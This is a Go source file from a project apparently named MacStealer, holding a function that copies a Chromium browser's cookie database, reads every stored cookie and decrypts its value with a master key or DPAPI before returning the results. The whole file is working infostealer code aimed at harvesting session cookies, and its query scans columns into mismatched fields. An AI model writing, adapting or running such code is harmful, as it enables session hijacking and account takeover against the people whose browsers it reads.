package browsingdata

import (
	"database/sql"
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"github.com/ultra-supara/MacStealer/decrypter"
	"github.com/ultra-supara/MacStealer/util"
)

type ChromiumCookie []Cookie

type Cookie struct {
	Host         string `json:"host"`
	Path         string `json:"path"`
	KeyName      string `json:"keyname"`
	encryptValue []byte
	Value        string    `json:"value"`
	IsSecure     bool      `json:"secure"`
	IsHTTPOnly   bool      `json:"httponly"`
	HasExpire    bool      `json:"has_expire"`
	IsPersistent bool      `json:"persistent"`
	CreateDate   time.Time `json:"create_date"`
	ExpireDate   time.Time `json:"expire_date"`
}

func GetCookie(base64MasterKey string, path string) ([]Cookie, error) {
	// Decode masterkey
	key, err := base64.StdEncoding.DecodeString(base64MasterKey)
	if err != nil {
		return nil, fmt.Errorf("Failed to decode master key: %w", err)
	}

	// Copy logindata db and journal file to current directory
	cFile := "./cookie"
	err = util.FileCopy(path, cFile)
	if err != nil {
		return nil, fmt.Errorf("DB FileCopy failed: %w", err)
	}
	defer os.Remove(cFile)

	cookieDB, err := sql.Open("sqlite3", fmt.Sprintf("file:%s", cFile))
	defer cookieDB.Close()
	rows, err := cookieDB.Query(`SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var c []Cookie
	for rows.Next() {
		var (
			hostKey, host, path                           string
			isSecure, isHTTPOnly, hasExpire, isPersistent int
			createDate, expireDate                        int64
			value, encryptValue                           []byte
		)

		if err = rows.Scan(&hostKey, &encryptValue, &host, &path, &createDate, &expireDate, &isSecure, &isHTTPOnly, &hasExpire, &isPersistent); err != nil {
			log.Println(err)
		}

		cookie := Cookie{
			KeyName:      hostKey,
			Host:         host,
			Path:         path,
			encryptValue: encryptValue,
			IsSecure:     util.IntToBool(isSecure),
			IsHTTPOnly:   util.IntToBool(isHTTPOnly),
			HasExpire:    util.IntToBool(hasExpire),
			IsPersistent: util.IntToBool(isPersistent),
			CreateDate:   util.TimeEpoch(createDate),
			ExpireDate:   util.TimeEpoch(expireDate),
		}
		if len(encryptValue) > 0 {
			var err error
			if key == nil {
				value, err = decrypter.DPApi(encryptValue)
			} else {
				value, err = decrypter.Chromium(key, encryptValue)
			}
			if err != nil {
				log.Println(err)
			}
		}
		if value != nil {
			cookie.Value = base64.StdEncoding.EncodeToString(value)
		} else {
			cookie.Value = ""
		}
		c = append(c, cookie)
	}
	return c, nil
}
